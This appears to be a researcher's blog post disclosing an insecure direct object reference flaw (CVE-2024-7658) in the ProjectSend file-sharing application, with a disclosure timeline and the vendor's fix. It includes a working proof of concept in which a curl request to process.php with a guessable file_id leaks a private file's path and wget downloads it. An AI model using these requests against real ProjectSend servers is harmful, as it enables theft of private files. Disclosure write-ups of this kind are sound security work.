---
layout: single
title:  "Downloading Private Files from ProjectSend - An IDOR Vulnerability"
author_profile: true
toc: true
related: true
classes: wide
mermaid: true
tags: 
    - vulnerability
header:
  teaser: /assets/images/projectsend_dashboard.png 
---

In a [previous post](/The-Harmless-Pihole-Bug/) I explained that my research into security vulnerabilities in Pi-hole led to me to discovering a more severe vulnerability in another project. In this article I will talk about the vulnerability that i found in [ProjectSend](https://www.projectsend.org/).
## What is ProjectSend?

ProjectSend is a self-hosted file sharing application based on PHP and MySQL. It's advertised as a secure, private, and easy way to share data with specific clients that can be configured through its web dashboard.

![process.php](/assets/images/projectsend_dashboard.png)
*Fig 1. ProjectSend Web Dashboard*
## What was the vulnerability?


The vulnerability had to do with the way uploaded files were handled by the **process.php** script. That endpoint was responsible for handling logins, changing language settings, and accessing files and metadata. Now while most of the functions of the script first checked authorization levels before continuing, one function responsible for generating file previews failed to do that. What this meant is that any anonymous user could request the preview of a file matching a number, and if a file associated with that number existed, the location to download that file directly would be returned. This is what is known as an insecure direct object reference (IDOR) vulnerability.

![process.php](/assets/images/projectsend_process_php.png)
*Fig 2. ProjectSend process.php insecure get_preview function*
## What is an IDOR?

In designing software to protect data from unauthorized access it's necessary to place a "security checkpoint" somewhere between the user and the data they are trying to access. 

### Security flow
<div class="mermaid">
flowchart LR
    user --> id2[security checkpoint] --> id3[secured data]
</div>
<br>
A common mistake that is made is to either place this check in a location that is easily bypassed or to assume that any user in a location "after" this checkpoint must be authorized. In the case of ProjectSend, the previewing of files was meant to be used in the **manage-downloads.php** endpoint which is inaccessible to users that are not logged in.

![Manage Downloads Dashboard](/assets/images/projectsend_manage_downloads.png)
*Fig 3. ProjectSend Manage Downloads Dashboard*

However, the **get_preview** function which was included from **process.php**, can actually be called by *any* unauthenticated user. This allows the leakage of the path of the uploaded file, with which it can be directly downloaded.

### Assumed secure data access
<div class="mermaid">
flowchart LR
    Unauthenticated --> id2[Log In] --> id3[Manage Downloads] --> id4[get_preview] --> id5[File Object] --> Download
</div>
 
### Actual insecure data access
<div class="mermaid">
flowchart LR
    Unauthenticated --> id4[get_preview] --> id5[File Object] --> Download
</div>
<br>
The **get_preview** function itself should of been checking for authorization but instead it insecurely connects directly to the file object reference and allows anyone to download it. That is what the following proof of concept demonstrates.

## Proof of Concept

```
> curl -i 'http://[ProjectSend-Server]/process.php?do=get_preview&file_id=4'
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 13 Jan 2025 08:46:45 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/8.3.9
Set-Cookie: PHPSESSID=ogt4nhpr5oaov13ft05a7q93jn; path=/
Pragma: no-cache
Cache-Control: no-store, no-cache, must-revalidate, max-age=0
Expires: Sat, 26 Jul 1997 05:00:00 GMT

{"name":"Private_pdf.pdf","file_url":"http:\/\/[ProjectSend-Server]\/\/upload\/files\/1736756751-d033e22ae348aeb5660fc2140aec35850c4da997-Private_pdf.pdf","type":"pdf","mime_type":"application\/pdf"}

> wget http://[ProjectSend-Server]//upload/files/1736756751-d033e22ae348aeb5660fc2140aec35850c4da997
-Private_pdf.pdf
--2025-01-13 09:49:26--  http://[ProjectSend-Server]//upload/files/1736756751-d033e22ae348aeb5660fc2140aec35850c4da997-Private_pdf.pdf
<REDACTED>
HTTP request sent, awaiting response... 200 OK
Length: 717589 (701K) [application/pdf]
Saving to: '1736756751-d033e22ae348aeb5660fc2140aec35850c4da997-Private_pdf.pdf'

1736756751-d033e22ae34 100%[==========================>] 700.77K  --.-KB/s    in 0.07s

2025-01-13 09:49:26 (10.0 MB/s) - '1736756751-d033e22ae348aeb5660fc2140aec35850c4da997-Private_pdf.pdf' saved [717589/717589]

```

## What is the consequence of this vulnerability, and how widely used is the software?

Since the file IDs are numerical and increment by one, this vulnerability allowed the download of all previewable files on the target server. This included PDF, image, audio, and video files. No setting could mitigate or prevent this. The vulnerability is present on ProjectSend versions r1605 and lower.

According to [recent surveys by Censys](https://censys.com/cve-2024-11680/), there are over 4000 public facing ProjectSend servers. 

## How did the vendor respond and fix the vulnerability?

I informed the project maintainer, Ignacio, via email July 20th, 2024. I received a response 13 days later informing me of the [fix](https://github.com/projectsend/projectsend/commit/eb5a04774927e5855b9d0e5870a2aae5a3dc5a08) and I was credited along with another researcher in the [GitHub release](https://github.com/projectsend/projectsend/releases/tag/r1720) and [website changelog](https://www.projectsend.org/change-log/). The fix they applied was to add the following code before the execution of the get_preview function:

```
if (!user_can_download_file(CURRENT_USER_ID, $_GET['file_id'])) {
                exit_with_error_code(403);
            }
```
 
The vulnerability was assigned [CVE-2024-7658](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-7658)

## Going forward

This was another fun experience in probing open source software for vulnerabilities. This case especially highlights the ease at which IDORs can be introduced into software and hidden under the assumption of security until examined closely. It is also thanks to open source that such issues can be ironed out and lessons learned.
